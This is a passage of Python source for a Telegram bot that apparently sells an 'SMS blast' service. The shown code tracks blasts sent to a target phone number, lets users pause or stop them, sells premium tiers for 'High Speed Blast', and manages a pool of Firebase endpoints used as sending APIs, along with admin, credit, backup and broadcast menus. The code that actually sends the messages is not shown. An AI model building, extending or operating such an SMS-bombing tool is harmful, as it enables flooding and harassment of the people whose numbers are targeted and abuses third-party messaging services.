    task = asyncio.create_task(worker_loop())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        USER_SESSIONS.pop(uid, None)

    d_fin = load()
    d_fin["stats"]["total_sent"] = int(d_fin["stats"].get("total_sent", 0) or 0) + sent_ok
    d_fin["stats"]["total_failed"] = int(d_fin["stats"].get("total_failed", 0) or 0) + sent_fail
    for fb_id, delta in api_usage_delta.items():
        b = d_fin["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
        b["sent"] += delta["sent"]
        b["failed"] += delta["failed"]

    u_rec = d_fin.setdefault("users", {}).get(str(uid))
    if u_rec is not None:
        u_rec["uses"] = int(u_rec.get("uses", 0) or 0) + sent_ok
        if not unlimited and sent_ok > 0:
            u_rec["credits"] = max(0, int(u_rec.get("credits", 0) or 0) - sent_ok)

    d_fin.setdefault("sms_history", {}).setdefault(str(uid), []).append({
        "number": number,
        "message": message[:100],
        "timestamp": int(time.time()),
        "status": "stopped" if was_cancelled else "completed",
        "sent": sent_ok,
        "total": count,
    })

    duration = int(time.time() - start_time)
    log_activity(d_fin, "sms_blast", uid, f"Sent {sent_ok}/{count} (fail={sent_fail}) in {fmt_duration(duration)}")
    save(d_fin)

    status_tag = "🛑 STOPPED" if was_cancelled else "✅ COMPLETED"
    rem_line = "" if unlimited else f"\n{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ : <b>{get_user_credits(uid, d_fin)}</b>"
    back_row = (
        [btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
        if is_admin(uid, d_fin)
        else [btn("sᴇɴᴅ ᴀɢᴀɪɴ", "user:send", EMOJI_ROCKET, "🚀", style="success"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]
    )

    try:
        await progress_msg.edit_text(
            f"╔══════════════════════╗\n"
            f"  {em(EMOJI_CHECK, '📊')} <b>{sc('sms blast complete!')}</b>\n"
            f"╚══════════════════════╝\n\n"
            f"{em(EMOJI_PHONE, '📞')} ᴛᴀʀɢᴇᴛ  : <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_CHECK, '📤')} sᴇɴᴛ    : <b>{sent_ok}</b> / <b>{count}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ  : <b>{sent_fail}</b>\n"
            f"{em(EMOJI_GEAR, '⏱')} ᴛɪᴍᴇ    : <b>{fmt_duration(duration)}</b>\n"
            f"{em(EMOJI_STAR, '📌')} sᴛᴀᴛᴜs  : <b>{status_tag}</b>{rem_line}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_row]),
            parse_mode="HTML",
        )
    except Exception:
        pass

    asyncio.create_task(
        send_channel_log(
            bot,
            f"🚀 <b>BLAST LOG</b>\n👤 UID: <code>{uid}</code>\n📞 Target: <code>{number}</code>\n"
            f"✅ Sent: <b>{sent_ok}</b> | ❌ Fail: <b>{sent_fail}</b> | ⏱ <b>{fmt_duration(duration)}</b> | {status_tag}",
        )
    )

@R.callback_query(F.data == "user:pause_send")
async def user_pause_send(cq: CallbackQuery):
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(cq.from_user.id)
        if not s or (s.task and s.task.done()):
            await cq.answer("Koi active blast nahi hai.", show_alert=True)
            return
        async with s.lock:
            s.paused = True
    await cq.answer("⏸ Blast paused!")

@R.callback_query(F.data == "user:resume_send")
async def user_resume_send(cq: CallbackQuery):
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(cq.from_user.id)
        if not s or (s.task and s.task.done()):
            await cq.answer("Koi active blast nahi hai.", show_alert=True)
            return
        async with s.lock:
            s.paused = False
    await cq.answer("▶️ Blast resumed!")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery):
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(cq.from_user.id)
        if not s or (s.task and s.task.done()):
            await cq.answer("Already complete ya active nahi hai!", show_alert=True)
            return
        async with s.lock:
            s.cancelled = True
            s.paused = False
    await cq.answer("🛑 Stop signal sent!", show_alert=True)
# ========== GIVE PREMIUM (1d / 7d / 1m / 3m / 1y / CUSTOM) ==========
def give_premium_tier_kb() -> InlineKeyboardMarkup:
    rows = [
        [btn("1 ᴅᴀʏ • ₹10", "admin:give_prem_tier:1d", EMOJI_CROWN, "💎", style="success"), btn("7 ᴅᴀʏs • ₹30", "admin:give_prem_tier:7d", EMOJI_CROWN, "💎", style="success")],
        [btn("1 ᴍᴏɴᴛʜ • ₹70", "admin:give_prem_tier:1m", EMOJI_CROWN, "👑", style="primary"), btn("3 ᴍᴏɴᴛʜs • ₹130", "admin:give_prem_tier:3m", EMOJI_CROWN, "👑", style="primary")],
        [btn("1 ʏᴇᴀʀ • ₹200", "admin:give_prem_tier:1y", EMOJI_STAR, "🌟", style="success"), btn("ᴄᴜsᴛᴏᴍ ᴅᴀʏs", "admin:give_prem_tier:custom", EMOJI_GEAR, "📅", style="primary")],
        [btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data == "admin:give_prem")
async def admin_give_prem_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.give_premium_uid)
    await cq.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  {em(EMOJI_CROWN, '💎')} <b>{sc('give user premium')}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"Jis user ko premium dena hai uska <b>Telegram User ID</b> bhejo:\n"
        f"<i>Plans: 1d=₹10 | 7d=₹30 | 1m=₹70 | 3m=₹130 | 1y=₹200</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML",
    )

@R.message(S.give_premium_uid)
async def admin_give_prem_uid(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        target_uid = int((msg.text or "").strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid numeric User ID bhejo:", parse_mode="HTML")
        return

    await state.update_data(prem_target_uid=target_uid)
    await state.set_state(None)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Target User: <code>{target_uid}</code>\n\n"
        f"{em(EMOJI_CROWN, '💎')} <b>{sc('select premium duration')}</b>:",
        reply_markup=give_premium_tier_kb(),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("admin:give_prem_tier:"))
async def admin_give_prem_tier(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return

    fsmd = await state.get_data()
    target_uid = fsmd.get("prem_target_uid")
    if not target_uid:
        await cq.answer("⚠️ Pehle User ID enter karo!", show_alert=True)
        await admin_give_prem_start(cq, state)
        return

    tier_key = cq.data.split("admin:give_prem_tier:", 1)[1]
    if tier_key == "custom":
        await state.set_state(S.give_premium_custom_days)
        await cq.message.edit_text(
            f"{em(EMOJI_GEAR, '📅')} <b>Custom Days</b> for <code>{target_uid}</code>\n\nKitne din ka premium dena hai? (e.g. 15):",
            reply_markup=kb([(f"{sc('cancel')}", "admin:give_prem")]),
            parse_mode="HTML",
        )
        return

    tier_map = {t["key"]: t for t in PREMIUM_TIERS}
    tier = tier_map.get(tier_key)
    if not tier:
        await cq.answer("Invalid tier!", show_alert=True)
        return

    new_until = grant_user_premium(int(target_uid), tier["days"], tier["label"], d)
    log_activity(d, "grant_premium", cq.from_user.id, f"Granted {tier['label']} to {target_uid}")
    save(d)
    await state.clear()

    try:
        await cq.bot.send_message(
            int(target_uid),
            f"╔══════════════════════╗\n"
            f"  {em(EMOJI_CROWN, '💎')} <b>{sc('premium activated!')}</b>\n"
            f"╚══════════════════════╝\n\n"
            f"{em(EMOJI_STAR, '🏷')} <b>Plan   :</b> {tier['label']} (₹{tier['price']})\n"
            f"{em(EMOJI_CHECK, '⏳')} <b>Valid  :</b> <code>{fmt_time(new_until)}</code>\n"
            f"{em(EMOJI_ROCKET, '🚀')} <b>Access :</b> High Speed Blast Unlocked!",
            parse_mode="HTML",
        )
    except Exception:
        pass

    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Premium Granted!</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} User  : <code>{target_uid}</code>\n"
        f"{em(EMOJI_CROWN, '💎')} Plan  : <b>{tier['label']}</b>\n"
        f"{em(EMOJI_GEAR, '🗓')} Until : <code>{fmt_time(new_until)}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML",
    )

@R.message(S.give_premium_custom_days)
async def admin_give_prem_custom_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    try:
        days = int((msg.text or "").strip())
        if days < 1 or days > 3650:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} 1 se 3650 ke beech valid days bhejo:", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    target_uid = int(fsmd.get("prem_target_uid", 0))
    label = f"{days} Days Custom Premium"
    new_until = grant_user_premium(target_uid, days, label, d)
    log_activity(d, "grant_custom_premium", msg.from_user.id, f"Granted {days}d to {target_uid}")
    save(d)
    await state.clear()

    try:
        await msg.bot.send_message(
            target_uid,
            f"{em(EMOJI_CROWN, '💎')} <b>{label} Activated!</b>\n"
            f"{em(EMOJI_CHECK, '⏳')} Valid till: <code>{fmt_time(new_until)}</code>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>{label}</b> given to <code>{target_uid}</code>!\n"
        f"{em(EMOJI_GEAR, '🗓')} Valid till: <code>{fmt_time(new_until)}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "admin:prem_plans")
async def admin_prem_plans_view(cq: CallbackQuery):
    d = load()
    lines = [
        f"╔══════════════════════╗",
        f"  {em(EMOJI_CROWN, '💎')} <b>{sc('premium price list')}</b>",
        f"╚══════════════════════╝\n",
        f"<b>{sc('credits / contact')}</b>: {CREDIT_CONTACT_HANDLE} | <b>{sc('owner')}</b>: {SUPER_ADMIN_NAME} 👇\n",
    ]
    rows = []
    for t in PREMIUM_TIERS:
        lines.append(f"{em(EMOJI_MONEY, '💰')} <b>{t['label']}</b> — <code>₹{t['price']}</code> ({t['days']}d)")
    rows.append([btn_url("ᴄᴏɴᴛᴀᴄᴛ @ᴛᴄxsᴜ ɴᴏᴡ", CREDIT_CONTACT_LINK, EMOJI_MONEY, "💳", style="success")])
    back_cb = "admin:home" if is_admin(cq.from_user.id, d) else "user:home"
    rows.append([btn("ʙᴀᴄᴋ", back_cb, EMOJI_GEAR, "🔙", style="danger")])
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

# ========== ADD DATABASE & EXPORT DATABASES ==========
@R.callback_query(F.data == "admin:db:add")
async def admin_db_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.import_db_file)
    await cq.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  {em(EMOJI_CHECK, '📥')} <b>{sc('add / import database')}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"Apni exported <b>JSON database file</b> (<code>.json</code>) upload karein.\n"
        f"Isse users, credits, premium validity, firebases, redeem codes aur settings restore ho jayenge.\n"
        f"<i>Storage path:</i> <code>{_DATA_FILE}</code>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML",
    )

@R.message(S.import_db_file, F.document)
async def admin_db_add_file(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id, load()):
        await state.clear()
        return

    doc = msg.document
    if not (doc.file_name or "").lower().endswith(".json"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya valid <b>.json</b> database file bhejo!", parse_mode="HTML")
        return

    try:
        file_info = await msg.bot.get_file(doc.file_id)
        downloaded = await msg.bot.download_file(file_info.file_path)
        parsed = json.loads(downloaded.read().decode("utf-8"))
        if not isinstance(parsed, dict) or "users" not in parsed:
            raise ValueError("Invalid database structure")
    except Exception as e:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid JSON DB file: <code>{str(e)[:60]}</code>", parse_mode="HTML")
        return

    if MAIN_OWNER not in parsed.get("owners", []):
        parsed.setdefault("owners", []).insert(0, MAIN_OWNER)

    save(parsed)
    restored = load()
    log_activity(restored, "import_database", msg.from_user.id, f"Imported {doc.file_name}")
    save(restored)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Database Restored Successfully!</b>\n\n"
        f"{em(EMOJI_STAR, '👥')} Users     : <b>{len(restored.get('users', {}))}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} Firebases : <b>{len(restored.get('firebases', []))}</b>\n"
        f"{em(EMOJI_GEAR, '💾')} Path      : <code>{_DATA_FILE}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ʜᴜʙ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML",
    )

@R.message(S.import_db_file)
async def admin_db_add_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf <b>.json</b> database file upload karein!", parse_mode="HTML")

@R.callback_query(F.data == "admin:db:export")
async def admin_db_export(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await cq.answer("📤 Exporting databases...")
    raw_bytes = json.dumps(d, indent=2, ensure_ascii=False).encode("utf-8")
    ts_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    doc = BufferedInputFile(raw_bytes, filename=f"flexxy_monster_db_{ts_str}.json")
    await cq.message.reply_document(
        document=doc,
        caption=(
            f"{em(EMOJI_CHECK, '📤')} <b>Database Export Backup</b>\n"
            f"👥 Users: <b>{len(d.get('users', {}))}</b> | 🔥 APIs: <b>{len(d.get('firebases', []))}</b>\n"
            f"🕒 <code>{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</code>"
        ),
        parse_mode="HTML",
    )

# ========== CUSTOM INTERVAL AUTO NOTIFICATION MENU & CONTROLS ==========
def auto_notif_kb(d: dict) -> InlineKeyboardMarkup:
    ab = d.get("auto_broadcast", {})
    is_on = bool(ab.get("enabled"))
    cur_min = int(ab.get("interval_minutes", 5) or 5)
    toggle_btn = (
        btn("ᴛᴜʀɴ ᴏғғ", "owner:autonotif:off", EMOJI_CROSS, "🔴", style="danger")
        if is_on
        else btn("ᴛᴜʀɴ ᴏɴ", "owner:autonotif:on", EMOJI_CHECK, "🟢", style="success")
    )

    def _iv_btn(label: str, mins: int):
        active_mark = " ✓" if cur_min == mins else ""
        st = "success" if cur_min == mins else "primary"
        return btn(f"{label}{active_mark}", f"owner:autonotif:iv:{mins}", EMOJI_GEAR, "⏱", style=st)

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [toggle_btn, btn("sᴇᴛ / ᴇᴅɪᴛ ᴍsɢ", "owner:autonotif:set", EMOJI_BELL, "✏️", style="primary")],
            [_iv_btn("1ᴍ", 1), _iv_btn("5ᴍ", 5), _iv_btn("15ᴍ", 15)],
            [_iv_btn("30ᴍ", 30), _iv_btn("1ʜ", 60), btn("ᴄᴜsᴛᴏᴍ ᴛɪᴍᴇ", "owner:autonotif:iv:custom", EMOJI_GEAR, "🕒", style="primary")],
            [btn("sᴇɴᴅ ɴᴏᴡ (ᴛᴇsᴛ)", "owner:autonotif:now", EMOJI_ROCKET, "🚀", style="success"), btn("ᴄʟᴇᴀʀ ᴍsɢ", "owner:autonotif:clear", EMOJI_CROSS, "🗑", style="danger")],
            [btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="primary")],
        ]
    )

@R.callback_query(F.data == "owner:autonotif:menu")
async def owner_autonotif_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.clear()
    ab = d.get("auto_broadcast", {})
    iv_label = fmt_interval_label(ab.get("interval_minutes", 5))
    status = f"{em(EMOJI_CHECK, '🟢')} <b>ON (Har {iv_label})</b>" if ab.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} <b>OFF (Har {iv_label})</b>"
    raw_msg = (ab.get("message") or "").strip()
    preview = (raw_msg[:220] + ("..." if len(raw_msg) > 220 else "")) if raw_msg else "<i>Set nahi hai</i>"
    last_run = fmt_time(ab.get("last_run", 0)) if ab.get("last_run") else "Kabhi nahi"

    await cq.message.edit_text(
        f"╔══════════════════════╗\n"
        f"  {em(EMOJI_BELL, '🔔')} <b>{sc('auto notification')}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{em(EMOJI_GEAR, '⚙️')} <b>Status   :</b> {status}\n"
        f"{em(EMOJI_GEAR, '⏱')} <b>Interval :</b> <code>{iv_label}</code>\n"
        f"{em(EMOJI_STAR, '🕒')} <b>Last Run :</b> <code>{last_run}</code>\n"
        f"{em(EMOJI_CHECK, '♻️')} <b>Old Delete:</b> <code>ENABLED</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>Message:</b>\n{preview}",
        reply_markup=auto_notif_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:autonotif:iv:"))
async def owner_autonotif_set_interval(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    val = cq.data.split("owner:autonotif:iv:", 1)[1]
    if val == "custom":
        await state.set_state(S.auto_msg_custom_min)
        await cq.message.edit_text(
            f"{em(EMOJI_GEAR, '🕒')} <b>Custom Interval (Minutes)</b>\n\n"
            f"Kitne minutes baad notification bhejna hai? (e.g. <code>1</code>, <code>10</code>, <code>60</code> = 1 ghanta, <code>120</code> = 2 ghante):",
            reply_markup=kb([(f"{sc('cancel')}", "owner:autonotif:menu")]),
            parse_mode="HTML",
        )
        return

    try:
        mins = int(val)
        if mins < 1 or mins > 10080:
            raise ValueError
    except Exception:
        await cq.answer("❌ Invalid interval!", show_alert=True)
        return

    ab = d.setdefault("auto_broadcast", {"enabled": False, "interval_minutes": 5, "message": "", "last_msg_ids": {}, "last_run": 0, "runs": 0})
    ab["interval_minutes"] = mins
    save(d)
    await cq.answer(f"⏱ Interval set: {fmt_interval_label(mins)}", show_alert=True)
    await owner_autonotif_menu(cq, state)

@R.message(S.auto_msg_custom_min)
async def owner_autonotif_custom_min_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    try:
        mins = int((msg.text or "").strip())
        if mins < 1 or mins > 10080:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} 1 se 10080 ke beech valid minutes bhejo (e.g. 1 ya 60):", parse_mode="HTML")
        return

    ab = d.setdefault("auto_broadcast", {"enabled": False, "interval_minutes": 5, "message": "", "last_msg_ids": {}, "last_run": 0, "runs": 0})
    ab["interval_minutes"] = mins
    save(d)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Interval set to <b>{fmt_interval_label(mins)}</b>!",
        reply_markup=auto_notif_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:autonotif:set")
async def owner_autonotif_set_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    d = load()
    iv_label = fmt_interval_label(d.get("auto_broadcast", {}).get("interval_minutes", 5))
    await state.set_state(S.auto_msg_text)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '✏️')} <b>Set Auto Notification Text</b>\n\n"
        f"Current Interval: <b>{iv_label}</b>\n"
        f"Jo message users ko bhejna hai woh likh kar bhejo:\n"
        f"<i>(Har naye message ke pehle purana auto-notification delete hoga)</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:autonotif:menu")]),
        parse_mode="HTML",
    )

@R.message(S.auto_msg_text)
async def owner_autonotif_set_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    text = (msg.text or "").strip()
    if not text:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Khali text nahi chalega, message bhejo.", parse_mode="HTML")
        return

    ab = d.setdefault("auto_broadcast", {"enabled": True, "interval_minutes": 5, "message": "", "last_msg_ids": {}, "last_run": 0, "runs": 0})
    ab["message"] = text
    ab["enabled"] = True
    save(d)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Auto Notification Set & Enabled ({fmt_interval_label(ab['interval_minutes'])})!</b>",
        reply_markup=auto_notif_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"owner:autonotif:on", "owner:autonotif:off"}))
async def owner_autonotif_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    ab = d.setdefault("auto_broadcast", {"enabled": False, "interval_minutes": 5, "message": "", "last_msg_ids": {}, "last_run": 0, "runs": 0})
    enable = cq.data == "owner:autonotif:on"
    if enable and not (ab.get("message") or "").strip():
        await cq.answer("⚠️ Pehle 'Set Auto Msg' se text set karo!", show_alert=True)
        return
    ab["enabled"] = enable
    save(d)
    iv_label = fmt_interval_label(ab.get("interval_minutes", 5))
    await cq.answer(f"🟢 Auto Msg ON ({iv_label})!" if enable else "🔴 Auto Msg OFF!", show_alert=True)
    if cq.message.reply_markup and any(
        b.callback_data == "owner:autonotif:menu"
        for row in cq.message.reply_markup.inline_keyboard
        for b in row
    ):
        await owner_autonotif_menu(cq, state)
    else:
        await admin_home(cq, state)

@R.callback_query(F.data == "owner:autonotif:now")
async def owner_autonotif_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    if not (d.get("auto_broadcast", {}).get("message") or "").strip():
        await cq.answer("⚠️ Pehle message set karo!", show_alert=True)
        return
    await cq.answer("🚀 Pushing...")
    ok, fail = await push_5min_notifications(cq.bot, d, force=True)
    await cq.message.answer(f"{em(EMOJI_CHECK, '✅')} Sent: <b>{ok}</b> | ❌ Failed: <b>{fail}</b>", parse_mode="HTML")

@R.callback_query(F.data == "owner:autonotif:clear")
async def owner_autonotif_clear(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    cur_min = int(d.get("auto_broadcast", {}).get("interval_minutes", 5) or 5)
    d["auto_broadcast"] = {"enabled": False, "interval_minutes": cur_min, "message": "", "last_msg_ids": {}, "last_run": 0, "runs": 0}
    save(d)
    await cq.answer("🗑 Cleared!", show_alert=True)
    await owner_autonotif_menu(cq, state)

# ========== ADMIN USERS MANAGER, FIREBASE, ROLES, CREDITS, REDEEM, LOGS ==========
def users_list_kb(d: dict, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start : start + per]
    banned = set(d.get("banned", []))

    lines = [
        f"╔══════════════════════╗",
        f"  {em(EMOJI_STAR, '👥')} <b>{sc('users manager')} ({len(items)})</b>",
        f"╚══════════════════════╝\n",
    ]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = (udata.get("name") or "User")[:16]
        credits = int(udata.get("credits", 0) or 0)
        rem_sec = get_premium_remaining_sec(uid, d)
        prem_tag = f"💎{fmt_remaining_validity(rem_sec)}" if rem_sec > 0 else f"💰{credits}"
        st = "🚫" if uid in banned else ("👑" if is_owner(uid, d) else ("🛡" if uid in d.get("admins", []) else "👤"))
        lines.append(f"{st} <code>{uid}</code> — <b>{name}</b> | {prem_tag}")

    rows = []
    nav = []
    if page > 0:
        nav.append(btn("◀️ ᴘʀᴇᴠ", f"admin:users:pg:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if start + per < len(items):
        nav.append(btn("ɴᴇxᴛ ▶️", f"admin:users:pg:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([btn("ɢɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ", "admin:give_prem", EMOJI_CROWN, "💎", style="success"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")])
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.in_({"admin:home", "admin:refresh", "owner:home", "owner:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(unified_admin_panel_text(d, is_owner(uid, d)), reply_markup=unified_admin_kb(d, is_owner(uid, d)), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "admin:users:list")
async def admin_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    text, markup = users_list_kb(d, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^admin:users:pg:(\d+)$"))
async def admin_users_page(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    page = int(cq.data.split(":")[-1])
    text, markup = users_list_kb(d, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    d["free_mode"] = cq.data == "owner:free:on"
    save(d)
    await cq.answer("🟢 Free Mode ON!" if d["free_mode"] else "🔴 Free Mode OFF!", show_alert=True)
    await admin_home(cq, state)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    current_fbs = fbs[page * per_page : (page + 1) * per_page]

    rows = [[btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕", style="success"), btn("ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄", style="primary")]]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))[:16]
        rows.append([btn(label, "noop", EMOJI_FIRE, "🔥", style="primary"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑", style="danger")])
    nav = []
    if page > 0:
        nav.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if page < total_pages - 1:
        nav.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", "admin:home", EMOJI_GEAR, "🔙", style="danger")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b> ({len(d.get('firebases', []))})", reply_markup=fb_menu_kb(d, page), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\nFormat: <code>Label | https://xyz.firebaseio.com</code>", reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    raw = (msg.text or "").strip()
    if "|" in raw:
        label, url = [x.strip() for x in raw.split("|", 1)]
    else:
        url = raw
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL https:// se start hona chahiye.", parse_mode="HTML")
        return
